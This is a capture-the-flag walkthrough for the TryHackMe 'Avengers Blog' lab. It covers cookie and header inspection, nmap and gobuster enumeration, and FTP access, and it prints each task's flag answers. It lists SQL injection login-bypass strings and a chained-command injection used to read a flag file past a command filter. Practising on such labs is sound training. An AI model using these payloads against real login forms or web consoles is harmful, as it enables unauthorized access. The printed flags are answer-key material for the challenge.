# Avengers Blog Wlakthrough
### Link
- https://tryhackme.com/room/avengers
------------------------
### Task 1 : Deploy
- Follow instructions
------------------------
### Task 2 - Cookies
- On the deployed Avengers machine you recently deployed, get the flag1 cookie value.
    - Open Web developer tools
    - If you work with Firefox
        - Select Storage
        - Cookies
        - [Avengers_Blog_2.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_2.png
    - If you work with Google Chrome
        - Select Application
        - Under Storage , select Cookies
        - [Avengers_Blog_1.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_1.png
- **Answer** : cookie_secret
---------------------------
### Task 3 - HTTP Header
- Look at the HTTP response headers and obtain flag 2
- Always under Developer tools
    - Firefox
        - Network tab
        - Refresh the page
        - On the left panel, select the first GET request
        - On the left panel, select the tab Header
        - Scroll down and find flag2
        - [Avengers_Blog_3.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_3.png

        - Google Chrome
            - Network tab
            - On the left panel, select the first request (should be materialize by the IP)
            - On the right panel,  select Headers tab
            - Find flag 2
            - [Avengers_Blog_4.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_4.png
- **Answers** : headers_are_important
---------------------------
### Task 4 - Enumeration
Look around the FTP share and read flag 3!
- Perform Nmap
    - sudo nmap -sC -sV -oN ./Avengers_Blog_Namp_result [IP]
    - [Avengers_Blog_5.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_5.png
- FTP is opened. THM platform provides the access credentials: username (groot) and a password (iamgroot)
    - Log to the FTP
    - Navigate and find flag3.txt
    - Download flag3.txt
        - get flag3.txt
        - quit
    - Consult flag3.txt
        - cat flag3.txt
    - [Avengers_Blog_6.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_6.png
- **Answers** : 8fc651a739befc58d450dc48e1f1fd2e
---------------------------
### Task 5 - Gobuster
- What is the directory that has an Avengers login?
- Gobuster command
    - sudo gobuster dir -u http://[IP] -w [Wordlist path]/directory-list-2.3-medium.txt
    - One interesting result: /portal (Status: 200)
    - Let's try this
- [Avengers_Blog_7.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_7.png
- ** Answers ** : /portal
---------------------------
### Task 6 - SQL Injection
-  Log into the Avengers site. View the page source, how many lines of code are there?
    - Based on the indication from TryHackMe, the portal is vulnerable to SQL injection. Before to try automatic tool such as BurpSuite, let's try some basic SQL Injection
    >' or "
    >-- or #
    >' OR '1
    >' OR 1 -- -
    >" OR "" = "
    >" OR 1 = 1 -- -
    >' OR '' = '
    >' OR 1 = 1 --   (correct pattern)
    - [Avengers_Blog_8.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_8.png
    - Check the source page
    - ** Answers ** : 223
---------------------------
### Task 7 - Remote code execurtion and linux
- Read the contents of flag5.txt
- Some command are authorize but not all. For example : ls , cd
    - cd ..;ls;tac flag5.txt
- [Avengers_Blog_9.png]https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_9.png
- ** Answers ** : d335e2d13f36558ba1e67969a1718af7

